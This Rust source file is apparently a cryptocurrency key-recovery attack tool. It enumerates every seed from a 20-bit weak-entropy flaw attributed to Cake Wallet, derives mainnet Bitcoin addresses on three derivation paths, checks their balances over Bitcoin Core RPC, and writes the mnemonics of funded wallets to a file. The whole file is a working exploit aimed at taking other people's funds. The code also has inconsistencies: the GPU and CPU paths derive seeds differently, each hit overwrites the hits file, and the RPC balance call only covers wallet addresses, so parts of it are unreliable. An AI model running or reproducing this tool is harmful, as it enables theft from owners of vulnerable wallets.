#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use crate::utils::electrum;
use anyhow::Result;
use bip39::Mnemonic;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Address, Network};
use bitcoincore_rpc::{Auth, Client, RpcApi};
use std::str::FromStr;
use tracing::{error, info, warn};
use std::io::Write;

/// Scans Cake Wallet vulnerable addresses (20-bit entropy) and checks balances via Bitcoin Core RPC
/// Uses GPU acceleration for address generation
pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
    info!("Cake Wallet RPC Scanner (GPU-Accelerated) - Checking 2^20 vulnerable addresses...");
    info!("Connecting to Bitcoin Core at {}...", rpc_url);

    let rpc = Client::new(
        rpc_url,
        Auth::UserPass(rpc_user.to_string(), rpc_pass.to_string()),
    )?;

    // Test connection
    let blockchain_info = rpc.get_blockchain_info()?;
    info!("Connected! Synced to block: {}", blockchain_info.blocks);
    info!("Chain: {}", blockchain_info.chain);

    // Initialize GPU
    println!("Initializing GPU...");

    #[cfg(not(feature = "gpu"))]
    {
        println!("GPU feature not enabled. Running CPU-only mode...");
        return run_cpu_only(rpc_url, rpc_user, rpc_pass);
    }

    #[cfg(feature = "gpu")]
    let solver = match GpuSolver::new() {
        Ok(s) => {
            println!("GPU initialized successfully!");
            s
        }
        Err(e) => {
            eprintln!("Warning: Failed to initialize GPU: {}", e);
            eprintln!("Falling back to CPU-only mode...");
            return run_cpu_only(rpc_url, rpc_user, rpc_pass);
        }
    };

    #[cfg(feature = "gpu")]
    {
        let _secp = Secp256k1::new();
        let network = Network::Bitcoin;

        // 20 bits = 1,048,576 possibilities
        let max_entropy: usize = 1 << 20;

        println!(
            "Scanning {} possible seeds with GPU acceleration...",
            max_entropy
        );

        let mut checked = 0;
        let mut found = 0;
        let start = std::time::Instant::now();

        // Process in batches for GPU efficiency
        let batch_size = 10000;
        let total_batches = max_entropy.div_ceil(batch_size);

        for batch_idx in 0..total_batches {
            let batch_start = batch_idx * batch_size;
            let batch_end = ((batch_idx + 1) * batch_size).min(max_entropy);
            let current_batch_size = batch_end - batch_start;

            // Prepare entropy batch for GPU
            let mut entropies = Vec::with_capacity(current_batch_size);
            for i in batch_start..batch_end {
                let mut entropy = [0u8; 16];
                entropy[0..4].copy_from_slice(&(i as u32).to_be_bytes());
                entropies.push(entropy);
            }

            // Generate addresses on GPU for all 3 derivation paths
            // Purpose parameter corresponds to derivation path
            // 44 = m/44'/0'/0'/0/0 (BIP44 Legacy), 84 = m/84'/0'/0'/0/0 (BIP84 SegWit), 0 = m/0'/0/0 (Cake Wallet Electrum)
            let addresses_44 = solver.compute_batch(&entropies, 44)?; // BIP39 seed
            let addresses_84 = solver.compute_batch(&entropies, 84)?; // BIP39 seed
            let addresses_0 = solver.compute_batch_electrum(&entropies, 0)?; // Electrum seed

            // Check each address via RPC
            for idx in 0..current_batch_size {
                let i = batch_start + idx;

                let paths_and_addresses = [
                    (addresses_44[idx], "m/44'/0'/0'/0/0", "Legacy"),
                    (addresses_84[idx], "m/84'/0'/0'/0/0", "SegWit"),
                    (addresses_0[idx], "m/0'/0/0", "Cake"),
                ];

                for (addr_bytes, path_str, path_type) in paths_and_addresses {
                    // Convert GPU address format to Bitcoin Address
                    // GPU returns addresses in a compact format, need to decode
                    let address_str = decode_address_from_gpu(&addr_bytes, path_type, network)?;

                    if let Ok(address) = Address::from_str(&address_str) {
                        let checked_address = address.assume_checked();
                        // Check balance via RPC
                        match rpc.get_received_by_address(&checked_address, Some(0)) {
                            Ok(amount) => {
                                if amount.to_sat() > 0 {
                                    // Regenerate mnemonic for display (CPU)
                                    let mut entropy_full = [0u8; 32];
                                    entropy_full[0..4].copy_from_slice(&(i as u32).to_be_bytes());
                                    if let Ok(mnemonic) =
                                        Mnemonic::from_entropy(&entropy_full[0..16])
                                    {
                                        found += 1;
                                        println!(
                                        "\n🎯 FOUND! Seed: {}, Path: {}, Address: {}, Amount: {} BTC",
                                        i,
                                        path_str,
                                        checked_address,
                                        amount.to_btc()
                                    );
                                        println!("Mnemonic: {}", mnemonic);

                                        // Write to file
                                        std::fs::write(
                                        "cake_wallet_hits.txt",
                                        format!("Seed: {}\nMnemonic: {}\nPath: {}\nAddress: {}\nAmount: {} BTC\n\n",
                                            i, mnemonic, path_str, checked_address, amount.to_btc())
                                    )?;
                                    }
                                }
                            }
                            Err(e) => {
                                // Address might not be in wallet, which is fine
                                if !e.to_string().contains("Invalid Bitcoin address") {
                                    eprintln!("RPC error for {}: {}", checked_address, e);
                                }
                            }
                        }
                    }
                }

                checked += 1;
            }

            // Progress update
            if batch_idx % 10 == 0 || batch_idx == total_batches - 1 {
                let elapsed = start.elapsed().as_secs_f64();
                let rate = checked as f64 / elapsed;
                print!(
                    "\rChecked: {}/{} ({:.1}%) - Speed: {:.0} addr/sec (GPU) - Found: {}",
                    checked,
                    max_entropy * 3,
                    (checked as f64 / (max_entropy * 3) as f64) * 100.0,
                    rate * 3.0, // Multiply by 3 paths
                    found
                );
                std::io::stdout().flush().ok();
            }
        }

        println!("\n\nScan complete!");
        println!(
            "Total checked: {} seeds x 3 paths = {} addresses",
            checked,
            checked * 3
        );
        println!("Total found: {}", found);

        Ok(())
    }
}

/// Decode GPU address format to Bitcoin address string
/// GPU returns addresses as base58-encoded strings in a 25-byte buffer
#[allow(unused_variables)]
#[allow(dead_code)]
fn decode_address_from_gpu(
    addr_bytes: &[u8; 25],
    addr_type: &str,
    network: Network,
) -> Result<String> {
    match addr_type {
        "Cake" | "SegWit" => {
            // P2WPKH SegWit: first 20 bytes are the witness program
            // GPU outputs raw 20-byte hash160, remaining bytes are zeros
            let witness_program = &addr_bytes[0..20];

            // Create P2WPKH address from witness program
            use bitcoin::WitnessVersion;
            let wp = bitcoin::WitnessProgram::new(WitnessVersion::V0, witness_program)
                .map_err(|e| anyhow::anyhow!("Invalid witness program: {}", e))?;

            let address = Address::from_witness_program(wp, network);
            Ok(address.to_string())
        }
        "Legacy" => {
            // P2PKH Legacy: base58-encoded address as null-terminated ASCII string
            let addr_str = std::str::from_utf8(addr_bytes)
                .unwrap_or("")
                .trim_end_matches('\0');

            if addr_str.is_empty() {
                return Err(anyhow::anyhow!("GPU returned empty address"));
            }

            Ok(addr_str.to_string())
        }
        _ => Err(anyhow::anyhow!("Unknown address type: {}", addr_type)),
    }
}

/// CPU-only fallback implementation (original code)
fn run_cpu_only(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
    println!("Running in CPU-only mode...");

    let rpc = Client::new(
        rpc_url,
        Auth::UserPass(rpc_user.to_string(), rpc_pass.to_string()),
    )?;

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;
    let max_entropy = 1 << 20;

    info!("Scanning {} possible seeds...", max_entropy);
    info!(
        "This will take approximately {} minutes at 1000 checks/sec",
        max_entropy / 1000 / 60
    );

    let mut checked = 0;
    let mut found = 0;
    let start = std::time::Instant::now();

    for i in 0..max_entropy {
        // Create deterministic entropy from small integer
        let mut entropy = [0u8; 32];
        entropy[0..4].copy_from_slice(&(i as u32).to_be_bytes());

        let mnemonic = Mnemonic::from_entropy(&entropy[0..16])?;
        // Use Electrum seed derivation ("electrum" salt) - critical for Cake Wallet vulnerability
        let seed = electrum::mnemonic_to_seed(&mnemonic.to_string());
        let root = Xpriv::new_master(network, &seed)?;

        // Check multiple derivation paths
        let paths = [
            ("m/0'/0/0", "Cake"),
            ("m/44'/0'/0'/0/0", "Legacy"),
            ("m/84'/0'/0'/0/0", "SegWit"),
        ];

        for (path_str, path_type) in paths {
            if let Ok(path) = DerivationPath::from_str(path_str) {
                if let Ok(child) = root.derive_priv(&secp, &path) {
                    let pubkey = child.to_keypair(&secp).public_key();
                    let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);

                    let address = match path_type {
                        "Legacy" => Address::p2pkh(compressed_pubkey, network),
                        "SegWit" | "Cake" => Address::p2wpkh(&compressed_pubkey, network),
                        _ => continue,
                    };

                    // Check balance via RPC
                    match rpc.get_received_by_address(&address, Some(0)) {
                        Ok(amount) => {
                            if amount.to_sat() > 0 {
                                found += 1;
                                warn!(
                                    "\n🎯 FOUND! Seed: {}, Path: {}, Address: {}, Amount: {} BTC",
                                    i,
                                    path_str,
                                    address,
                                    amount.to_btc()
                                );
                                warn!("Mnemonic: {}", mnemonic);

                                // Write to file
                                std::fs::write(
                                    "cake_wallet_hits.txt",
                                    format!("Seed: {}\nMnemonic: {}\nPath: {}\nAddress: {}\nAmount: {} BTC\n\n",
                                        i, mnemonic, path_str, address, amount.to_btc())
                                )?;
                            }
                        }
                        Err(e) => {
                            // Address might not be in wallet, which is fine
                            if !e.to_string().contains("Invalid Bitcoin address") {
                                error!("RPC error for {}: {}", address, e);
                            }
                        }
                    }
                }
            }
        }

        checked += 1;
        if checked % 1000 == 0 {
            let elapsed = start.elapsed().as_secs_f64();
            let rate = checked as f64 / elapsed;
            info!(
                "Checked: {}/{} ({:.1}%) - Speed: {:.0} addr/sec - Found: {}",
                checked,
                max_entropy * 3,
                (checked as f64 / (max_entropy * 3) as f64) * 100.0,
                rate,
                found
            );
        }
    }

    info!("\n\nScan complete!");
    info!("Total checked: {}", checked);
    info!("Total found: {}", found);

    Ok(())
}
